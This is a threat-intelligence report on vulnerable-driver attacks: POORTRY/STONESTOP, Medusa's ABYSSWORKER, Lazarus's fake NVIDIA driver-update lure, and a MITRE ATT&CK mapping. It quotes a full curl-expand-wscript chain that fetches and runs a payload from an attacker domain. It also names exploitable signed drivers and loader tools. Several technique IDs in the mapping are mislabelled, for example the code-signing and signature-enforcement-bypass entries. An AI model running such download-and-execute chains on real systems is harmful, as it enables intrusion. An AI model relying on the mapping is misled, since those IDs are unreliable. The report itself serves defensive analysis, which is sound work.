## Introduction

In the contemporary cybersecurity landscape, adversaries are continuously refining their methods to circumvent robust security defenses. A particularly insidious trend involves the exploitation of device drivers, which operate at the highest privilege level within an operating system. By manipulating or introducing malicious drivers, attackers can achieve deep system compromise, often remaining undetected by conventional security solutions. This report delves into the intricacies of such attacks, examining how threat actors leverage vulnerable or malicious drivers, including those associated with video and audio functionalities, to achieve their objectives. We will explore the attack vectors, technical procedures, and the broader implications for organizational security, providing a detailed threat intelligence profile to aid in defense and mitigation strategies.




## What are BYOVD Attacks?

BYOVD (Bring Your Own Vulnerable Driver) attacks represent a sophisticated class of cyberattacks that capitalize on inherent trust placed in legitimate software components. These attacks exploit vulnerabilities present in authentic, digitally signed drivers to bypass conventional security mechanisms and achieve profound system compromise. The fundamental premise of BYOVD involves adversaries introducing or leveraging a legitimate but flawed driver to gain an advantageous position within the target system, often with the ultimate goal of disabling or obfuscating security controls.

Drivers, by their very nature, operate at Ring 0, the most privileged execution level of an operating system. This elevated status grants them direct, unrestricted access to critical system resources, including memory, CPU, and I/O operations. Consequently, any vulnerability within these drivers can be exploited by attackers to corrupt, crash, or entirely disable protective drivers and other security tools that also operate at this privileged level. This effectively creates a blind spot for security solutions, paving the way for unimpeded malicious activities.

The effectiveness of BYOVD stems from its ability to turn a system's trust against itself. Modern operating systems, particularly Windows, enforce strict digital signing requirements for drivers to ensure their authenticity and integrity. This measure is designed to prevent the loading of malicious, unsigned code into the kernel. However, BYOVD circumvents this protection by abusing drivers that are *properly signed* but contain exploitable flaws. Even in cases where a vulnerable driver's signature has been revoked, certain configurations or attack techniques might still allow it to load, rendering blacklisting efforts less effective. This inherent trust, combined with the kernel-level access, makes BYOVD a potent tool for adversaries seeking to establish deep and persistent control over compromised systems.





## Targeted Attacks Leveraging Signed Malicious Microsoft Drivers

Recent investigations have revealed a disturbing trend of threat actors abusing legitimately signed Microsoft drivers in active intrusions. These attacks have targeted a wide range of industries, including telecommunications, Business Process Outsourcing (BPO), Managed Security Service Providers (MSSPs), and financial services. The core of this technique lies in the exploitation of the trust that security solutions implicitly place in drivers signed by Microsoft through the Windows Hardware Quality Labs (WHQL) process.

### The Attack Mechanism

Adversaries have demonstrated the ability to circumvent the rigorous driver signing process established by Microsoft. While this process includes stringent checks to validate the identity of the developer and the integrity of the submitted driver, threat actors have devised methods to submit drivers that appear benign during the automated and manual review phases. Once these malicious drivers receive a valid digital signature from Microsoft, they become a powerful tool for attackers. The signature allows the driver to be loaded into the Windows kernel, bypassing the Driver Signature Enforcement (DSE) security feature, which is designed to prevent unsigned or tampered drivers from running.

### The POORTRY and STONESTOP Malware Toolkit

A notable example of this attack methodology is the use of a specialized toolkit consisting of two primary components: POORTRY and STONESTOP.

*   **POORTRY:** This is the kernel-mode component of the toolkit, a malicious driver designed specifically to terminate Antivirus (AV) and Endpoint Detection and Response (EDR) processes. It exposes an Input/Output Control (IOCTL) interface, which allows it to receive commands from a user-mode application and tamper with targeted processes, effectively blinding the system's defenses.

*   **STONESTOP:** This is the user-land component that functions as both a loader and an installer for the POORTRY driver. It is responsible for orchestrating the attack by identifying the target security processes and instructing the POORTRY driver to terminate them. In some versions, STONESTOP reads the names of target processes from an external configuration file, allowing for easy adaptation to different environments. In other, more targeted versions, the process names are embedded directly into the executable.

### Attack Progression

The typical attack chain involving this toolkit unfolds as follows:

1.  **Initial Compromise:** The threat actor gains initial access to the target system through various means, such as exploiting public-facing applications (e.g., ProxyShell vulnerabilities in Microsoft Exchange) or leveraging credentials obtained from initial access brokers.

2.  **Toolkit Deployment:** The STONESTOP and POORTRY components are deployed onto the compromised system.

3.  **Driver Installation:** The STONESTOP executable installs the POORTRY driver, which, due to its legitimate Microsoft signature, is loaded into the kernel without raising suspicion.

4.  **Defense Evasion:** The POORTRY driver, operating with the highest system privileges, proceeds to terminate the designated AV and EDR processes, rendering the system's security controls ineffective.

5.  **Post-Exploitation Activities:** With the security defenses disabled, the attacker is free to pursue their ultimate objectives, which can range from deploying ransomware (as observed with the Hive ransomware) to exfiltrating sensitive data or providing illicit services like SIM swapping.

### Implications

The abuse of the driver signing process represents a significant threat to enterprise security. It undermines a fundamental trust anchor in the Windows operating system and highlights the challenges of defending against adversaries who can successfully masquerade their malicious tools as legitimate, signed software. This technique demonstrates a high level of sophistication and a deep understanding of operating system internals, making it a formidable challenge for even well-equipped security teams.




## Medusa Ransomware and ABYSSWORKER Driver

The Medusa ransomware-as-a-service (RaaS) operation exemplifies the growing trend of ransomware groups integrating BYOVD techniques into their attack chains. Medusa has been observed leveraging a malicious driver dubbed **ABYSSWORKER** to disable anti-malware tools and facilitate further malicious activities, including the establishment of Remote Desktop Protocol (RDP) connections for persistent access.

### Technical Specifications of ABYSSWORKER

*   **Driver Identification:** The ABYSSWORKER driver is typically identified as `smuol.sys`, a name chosen to mimic legitimate system files, specifically the CrowdStrike Falcon driver `CSAgent.sys`, to avoid suspicion.

*   **Digital Signatures:** A critical aspect of ABYSSWORKER's evasion capabilities is its use of digital signatures. Analysis has shown that these drivers are signed using certificates that are likely stolen or have been revoked, often originating from Chinese companies. The presence of a digital signature, even if compromised or revoked, lends a false sense of legitimacy to the malware, allowing it to bypass security checks that rely solely on signature validation.

*   **Core Functionality:** Once successfully installed and initialized, ABYSSWORKER operates by adding its process ID to a list of global protected processes. It then actively monitors and responds to incoming device I/O control requests. These requests trigger a wide array of malicious operations, including:
    *   **Driver Activation:** Requires a specific password for full activation, indicating a level of control and obfuscation.
    *   **Kernel API Loading:** Dynamically loads necessary kernel APIs to perform its functions.
    *   **File System Manipulation:** Capable of copying and deleting files, which can be used for data exfiltration or to remove forensic evidence.
    *   **Process and Driver Termination:** A key capability is its ability to terminate specified processes and drivers, directly targeting and neutralizing security solutions.
    *   **Callback Removal:** Significantly, ABYSSWORKER can search for and remove all registered notification callbacks. This technique is particularly effective at blinding security products by preventing them from receiving critical system events.
    *   **System Control:** Includes functionalities such as disabling the malware itself (potentially for stealth or to avoid analysis) and initiating system reboots.

### Attack Procedures

The deployment and execution of the ABYSSWORKER driver within a Medusa ransomware attack typically follows these steps:

1.  **Initial Payload Delivery:** The Medusa ransomware encryptor is delivered to the target system, often via a loader that has been packed using a packer-as-a-service (PaaS) like HeartCrypt. This packing adds another layer of obfuscation, making initial detection more challenging.

2.  **Driver Deployment and Installation:** The loader component is responsible for deploying and installing the ABYSSWORKER driver (`smuol.sys`) onto the victim machine. The driver's compromised digital signature facilitates its loading into the kernel.

3.  **Security Tool Neutralization:** Upon successful installation, ABYSSWORKER leverages its kernel-level privileges to identify and neutralize various Endpoint Detection and Response (EDR) solutions. This is achieved through process termination and the removal of notification callbacks, effectively creating an environment where the ransomware can operate unimpeded.

4.  **Privilege Escalation and Persistence:** The elevated privileges gained through the vulnerable driver are then exploited to establish persistent access mechanisms. A common objective is to enable and utilize Remote Desktop Protocol (RDP) connections to the infected systems, providing attackers with a reliable backdoor for continued control and data exfiltration.

### Broader Implications

The use of ABYSSWORKER by Medusa ransomware underscores the evolving sophistication of cybercriminal groups. Their willingness to invest in and integrate kernel-level capabilities, combined with the abuse of digital certificates, poses a significant challenge to conventional endpoint security. This trend highlights the need for advanced behavioral monitoring and robust driver integrity verification mechanisms to detect and prevent such attacks.

Furthermore, the article notes similar vulnerabilities in other legitimate drivers, such as `vsdatant.sys` associated with Check Point's ZoneAlarm antivirus software. This indicates that the BYOVD technique is not isolated to a few specific drivers but is a broader attack surface that adversaries are actively exploring and exploiting across various software vendors.




## Lazarus Group ClickFake: Social Engineering for BYOVD Delivery

Recent investigations by Sekoia have revealed an evolution in the Lazarus Group's attack methodology, demonstrating how social engineering techniques can be used to deliver BYOVD components through sophisticated fake driver update campaigns. This represents a concerning development in the threat landscape, as it shows how traditional social engineering tactics can be weaponized to facilitate advanced kernel-level attacks.

### The ClickFake Campaign Methodology

The Lazarus Group has developed a refined social engineering approach that leverages fake job interview websites and driver update prompts to trick users into executing malicious payloads. This campaign, dubbed "ClickFake," specifically targets users with fabricated driver update requirements, exploiting the common IT practice of keeping system drivers current.

### Attack Vector Analysis

The campaign employs a multi-stage delivery mechanism that begins with social engineering and culminates in potential BYOVD payload deployment:

**Stage 1: Social Engineering Lure**
*   **Fake Driver Updates:** The campaign presents users with convincing driver update prompts, specifically targeting NVIDIA graphics drivers and other common hardware components.
*   **Legitimate Appearance:** The fake update sites closely mimic authentic driver download services, using domains like `smartdriverfix[.]cloud` to appear legitimate.
*   **Urgency Tactics:** Users are presented with urgent driver update requirements, leveraging time pressure to reduce critical thinking.

**Stage 2: Multi-Command Execution Chain**
The attack employs a sophisticated three-stage command execution pattern that has been observed in real-world incidents:

```bash
curl -k -o "%TEMP%\nvidiadrivers.zip" https://api.smartdriverfix[.]cloud/nvidiadrivers-kp9s.update
&& powershell -Command "Expand-Archive -Force -Path '%TEMP%\nvidiadrivers.zip' -DestinationPath '%TEMP%\nvidiadrivers'"
&& wscript "%TEMP%\nvidiadrivers\update.vbs"
```

This command chain demonstrates several sophisticated techniques:
*   **Domain Masquerading:** Uses driver-themed domains to appear legitimate
*   **File Masquerading:** Employs driver-related filenames (`nvidiadrivers.zip`) to reduce suspicion
*   **Multi-Stage Execution:** Combines download, extraction, and execution phases with error handling
*   **Temporary Directory Usage:** Leverages %TEMP% to avoid detection and facilitate cleanup

**Stage 3: VBS Payload Deployment**
The final stage involves VBS script execution, which can serve multiple purposes:
*   **System Reconnaissance:** Gathering system information to determine suitable BYOVD drivers
*   **Privilege Escalation:** Preparing for administrative access required for driver installation
*   **Payload Staging:** Downloading and preparing vulnerable drivers for subsequent exploitation
*   **Defense Evasion:** Implementing anti-analysis and sandbox evasion techniques

### BYOVD Integration Potential

While the observed ClickFake campaigns have primarily focused on delivering information stealers and backdoors, the delivery mechanism is perfectly positioned for BYOVD payload deployment:

*   **Administrative Context:** The driver update pretext naturally justifies requests for administrative privileges
*   **User Expectations:** Users expect driver installations to require elevated permissions and system-level access
*   **Detection Evasion:** The legitimate appearance of driver updates can bypass user suspicion and security awareness training
*   **Staging Capability:** The multi-stage approach allows for dynamic payload selection based on target system characteristics

### Technical Indicators and IOCs

**Command Line Patterns:**
*   `curl` or `wget` commands with driver-themed filenames
*   PowerShell `Expand-Archive` operations on driver-related archives
*   `wscript` execution of VBS files from temporary directories
*   Multi-command chains using `&&` operators for conditional execution

**File System Indicators:**
*   Temporary files with driver-themed names (`nvidiadrivers.zip`, `driverupdate.exe`)
*   VBS scripts in temporary directories with update-related names
*   Extracted archives containing multiple components mimicking driver packages

**Network Indicators:**
*   DNS queries to driver-themed domains (`smartdriverfix[.]cloud`, `driverupdate[.]com`)
*   HTTPS downloads from suspicious driver update services
*   User-Agent strings consistent with curl or PowerShell download activities

### Defensive Implications

The evolution of Lazarus Group's tactics to include driver-themed social engineering represents a significant threat to organizations:

1.  **Bypasses Traditional Training:** Standard phishing awareness training may not cover driver update scenarios
2.  **Exploits IT Processes:** Leverages legitimate IT maintenance activities as cover
3.  **Facilitates BYOVD:** Provides ideal cover for vulnerable driver deployment
4.  **Multi-Vector Attack:** Combines social engineering with technical exploitation

### Mitigation Strategies

Organizations should implement comprehensive defenses against these evolved social engineering tactics:

*   **User Training:** Specific awareness training on fake driver update campaigns
*   **Administrative Controls:** Centralized driver management and update policies
*   **Technical Controls:** Monitoring for driver-themed download patterns and multi-stage execution chains
*   **Network Security:** DNS filtering and reputation checking for driver-related domains
*   **Endpoint Protection:** Behavioral analysis for suspicious PowerShell and VBS execution patterns




## Technical Details and Procedures of Malicious Driver Attacks

The execution of malicious driver attacks, particularly those employing the Bring Your Own Vulnerable Driver (BYOVD) technique, involves a series of meticulously orchestrated steps designed to achieve deep system compromise and evade detection. These procedures leverage the inherent trust placed in legitimate drivers and the privileged access they command within an operating system.

### The BYOVD Attack Chain: A Step-by-Step Breakdown

1.  **Initial Access and Privilege Acquisition:** The foundational step for any BYOVD attack is the acquisition of administrative privileges on the target system. This is a critical prerequisite, as the installation of drivers typically requires elevated permissions. Adversaries may achieve this through various initial access vectors, including:
    *   **Exploiting Vulnerabilities:** Leveraging unpatched software vulnerabilities in public-facing applications or operating system components to gain an initial foothold and escalate privileges.
    *   **Social Engineering:** Employing sophisticated phishing, vishing, or other social engineering tactics to trick users into executing malicious payloads that grant administrative access.
    *   **Credential Theft:** Compromising user or administrator credentials through techniques like brute-force attacks, credential stuffing, or exploiting weak authentication mechanisms.

2.  **Installation of the Vulnerable Driver:** Once administrative privileges are secured, the attacker proceeds to install a legitimately signed but vulnerable driver. This driver is often a component of a widely used and trusted software product, such as a hardware utility, an antivirus solution, or a gaming peripheral driver. The legitimacy of its digital signature allows it to be loaded by the operating system without triggering immediate security alerts, as it appears to be a benign and trusted component.

3.  **Exploitation of Driver Vulnerability:** The installed legitimate driver contains a known or newly discovered vulnerability. This vulnerability, often a memory corruption flaw like a write-what-where condition (e.g., CVE-2021-21551 in certain Dell drivers), is then exploited by the attacker. The exploitation allows the attacker to execute arbitrary code within the highly privileged kernel space (Ring 0). This kernel-level access is the ultimate goal, as it grants the attacker complete control over the operating system, bypassing most security boundaries.

4.  **Bypassing Driver Signature Enforcement (DSE):** With kernel-level access, the attacker can then disable or bypass Windows Driver Signature Enforcement (DSE). DSE is a crucial security feature designed to prevent unsigned or maliciously modified drivers from loading into the kernel. By subverting DSE, the attacker removes a significant barrier, enabling them to load their own custom-developed, unsigned malicious drivers.

5.  **Loading the Malicious Unsigned Driver:** The final step in the core BYOVD chain involves loading the attacker's custom-crafted malicious driver. This driver, now operating with kernel-level privileges and without the constraint of DSE, can perform a wide array of highly impactful and stealthy operations.

### Post-Exploitation Activities Enabled by Kernel Access

Once the malicious driver is loaded and active in the kernel, adversaries gain unparalleled capabilities, allowing them to execute a diverse range of post-exploitation activities with high efficacy and stealth:

*   **Defense Evasion and Security Product Neutralization:** This is a primary objective. Malicious drivers can directly interact with and manipulate the operating system at a fundamental level to disable or interfere with security software. This includes unhooking EDR (Endpoint Detection and Response) callbacks, terminating antivirus processes, and removing security-related notification callbacks, effectively blinding security solutions and allowing other malicious payloads to operate unimpeded.

*   **Persistence Mechanisms:** Kernel-level access facilitates the establishment of highly resilient persistence. Attackers can configure their malicious drivers to load automatically at system boot, ensuring their presence even after system restarts. They can also manipulate system services or hijack legitimate execution flows to maintain a persistent foothold.

*   **Credential Access and Theft:** With direct access to system memory, malicious drivers can bypass protections on sensitive processes like LSASS (Local Security Authority Subsystem Service). This allows attackers to dump credentials (e.g., hashes, clear-text passwords) from memory, which can then be used for lateral movement within the network or for further attacks. Tools like Mimikatz, when combined with kernel access, become exceptionally potent for this purpose.

*   **Data Exfiltration and Manipulation:** The ability to interact directly with the file system and network stack at a low level enables efficient data exfiltration. Attackers can also manipulate or corrupt data, leading to data integrity issues or denial-of-service conditions.

*   **Rootkit Functionality:** Malicious drivers can implement rootkit capabilities, allowing them to hide their presence and the presence of other malicious components (files, processes, network connections) from both the operating system and security tools. This makes detection and remediation significantly more challenging.

*   **System Manipulation and Impact:** Attackers can perform actions that directly impact system availability or integrity, such as causing system crashes (Blue Screen of Death - BSOD) by overwriting critical system data, or deploying ransomware to encrypt files and render systems unusable.

### Open-Source Tools and Vulnerable Drivers

The proliferation of open-source tools and publicly known vulnerable drivers has significantly lowered the barrier to entry for attackers seeking to employ BYOVD techniques. Tools like **KDU (Kernel Driver Utility)** are widely used, supporting a multitude of vulnerable drivers for loading unsigned malicious code. Historically, tools like Stryker, DSEFix, and TDL were used, though many are now deprecated due to advancements in operating system security like PatchGuard.

Specific vulnerable drivers that have been exploited include various versions of Dell drivers (e.g., `dbutil_2_3.sys`, `dbutildrv2.sys` versions 2.5 and 2.7, associated with CVE-2021-21551), as well as others like `asrdrv101.sys`, `ucorew64.sys`, and `atillk64.sys` (CVE-2019-7246). The continued existence of these legitimately signed, yet vulnerable, drivers in the wild provides a fertile ground for adversaries.

This detailed understanding of the technical procedures and available tools is crucial for developing effective detection and mitigation strategies against malicious driver installation attacks.




## MITRE ATT&CK Framework Mapping

This section provides a structured mapping of the Tactics, Techniques, and Procedures (TTPs) observed in malicious driver installation attacks, particularly those employing the Bring Your Own Vulnerable Driver (BYOVD) technique, to the MITRE ATT&CK framework. This mapping helps in understanding the adversary's behavior and developing comprehensive defensive strategies.

### Initial Access (TA0001)

Initial Access tactics describe how adversaries try to gain their first foothold in a network. While BYOVD attacks often occur post-exploitation, the initial compromise is crucial for gaining the necessary administrative privileges to install drivers.

*   **Phishing (T1566):** Adversaries frequently use phishing campaigns to deliver malicious payloads. This can involve emails with deceptive content, attachments disguised as legitimate software updates (e.g., driver installers), or links to compromised websites that host malicious files.
    *   **Spearphishing Attachment (T1566.001):** Highly targeted phishing emails containing malicious driver installers or executables that initiate the BYOVD chain.
    *   **Spearphishing Link (T1566.002):** Links directing victims to fake driver download pages or compromised legitimate sites that distribute the malicious components.
*   **Exploit Public-Facing Application (T1190):** Exploiting vulnerabilities in internet-facing applications (e.g., web servers, VPNs) to gain initial access. The Cuba Ransomware Group, for instance, has been noted for exploiting vulnerabilities like ProxyShell in Microsoft Exchange Servers to achieve initial compromise.
*   **Valid Accounts (T1078):** Gaining access to legitimate user or administrator credentials through various means (e.g., brute-force attacks, credential stuffing, purchasing from initial access brokers) to facilitate the installation of malicious drivers or other initial access activities.

### Execution (TA0002)

Execution tactics involve techniques that result in adversary-controlled code running on a local or remote system.

*   **System Services (T1543):** Adversaries may create or modify system services to execute their malicious drivers. This provides a persistent and privileged execution environment.
    *   **Service Installation (T1543.003):** Installing the malicious driver as a new service to ensure its execution at system startup and maintain a persistent presence.
*   **Command and Scripting Interpreter (T1059):** Utilizing command-line interfaces (CLI) or scripting languages (e.g., PowerShell, Batch scripts) to execute the driver installation process, configure system settings, or launch other malicious components.

### Persistence (TA0003)

Persistence tactics describe techniques that adversaries use to maintain their foothold on systems across restarts, changed credentials, and other interruptions.

*   **Boot or Logon Autostart Execution (T1547):** Configuring the malicious driver or associated components to execute automatically at system boot or user logon, ensuring continued presence on the compromised system.
    *   **Kernel Modules and Extensions (T1547.006):** Malicious drivers, by their nature, operate as kernel modules, providing a deep and stealthy form of persistence that is difficult to detect and remove.
*   **Hijack Execution Flow (T1574):** Manipulating how programs are executed to maintain persistence. While less common for initial driver loading, it could be used to ensure the malicious driver is loaded in a specific order or context.

### Privilege Escalation (TA0004)

Privilege Escalation tactics describe techniques that adversaries use to gain higher-level permissions on a system or network.

*   **Exploitation for Privilege Escalation (T1068):** This is a core tactic in BYOVD attacks. Adversaries exploit vulnerabilities in legitimate, signed drivers to gain kernel-level (Ring 0) access. This provides the highest possible privileges on the system, allowing them to bypass security controls and perform highly sensitive operations.
*   **Abuse Elevation Control Mechanism (T1548):** Bypassing User Account Control (UAC) or other elevation mechanisms to install drivers without explicit user interaction or consent, making the attack more seamless.

### Defense Evasion (TA0005)

Defense Evasion tactics describe techniques that adversaries use to avoid detection throughout their compromise.

*   **Impair Defenses (T1562):** This is a primary objective of malicious driver attacks. Adversaries actively disable or modify security software to prevent detection and analysis.
    *   **Disable or Modify Tools (T1562.001):** Terminating or disabling Antivirus (AV) and Endpoint Detection and Response (EDR) processes is a common capability of malicious drivers like POORTRY and ABYSSWORKER, effectively blinding security solutions.
*   **Rootkit (T1014):** Malicious kernel-mode drivers often function as rootkits, hiding the presence of malicious processes, files, network connections, and other system components from security tools and the operating system itself.
*   **Code Signing (T1036.001):** Abusing legitimate or stolen code signing certificates to sign malicious drivers. This makes the drivers appear trustworthy to the operating system and security solutions, allowing them to bypass signature-based detection.
*   **Bypass User Account Control (T1548.002):** Techniques to bypass UAC prompts are often employed to install drivers without requiring explicit user interaction, contributing to the stealth of the attack.
*   **Subvert Trust Controls (T1553):** Manipulating trusted processes or components to achieve malicious objectives.
    *   **Driver Signature Enforcement Bypass (T1553.005):** Directly bypassing Windows Driver Signature Enforcement to load unsigned malicious drivers, a critical step in many BYOVD attacks.

### Credential Access (TA0006)

Credential Access tactics describe techniques for stealing credentials like account names and passwords.

*   **OS Credential Dumping (T1003):** Accessing and dumping credentials from the operating system. With kernel-level access, adversaries can bypass protections on processes like LSASS (Local Security Authority Subsystem Service) to extract sensitive authentication material.
    *   **LSASS Memory (T1003.001):** Exploiting kernel-level access to bypass LSA protection and dump credentials directly from the LSASS process memory, often using tools like Mimikatz with kernel-mode capabilities.

### Discovery (TA0007)

Discovery tactics describe techniques that allow the adversary to gain knowledge about the system and internal network.

*   **System Information Discovery (T1082):** Gathering details about the operating system, hardware configuration, and installed software to tailor subsequent attack steps.
*   **Process Discovery (T1057):** Identifying running processes, particularly security-related ones, to target for termination or manipulation.

### Impact (TA0040)

Impact tactics describe techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes.

*   **Data Encrypted for Impact (T1486):** Encrypting user and system files to render systems inoperable, a hallmark of ransomware attacks like those carried out by Medusa and Hive, which leverage malicious drivers for defense evasion.
*   **Inhibit System Recovery (T1490):** Deleting shadow copies, disabling backup processes, or otherwise hindering system recovery efforts to maximize the impact of ransomware or data destruction.
*   **Service Stop (T1489):** Stopping legitimate services, including critical security services, to facilitate malicious activities or cause denial of service.

This comprehensive mapping illustrates the multi-faceted nature of malicious driver attacks, demonstrating how they leverage various stages of the attack lifecycle to achieve their objectives with high privilege and stealth.
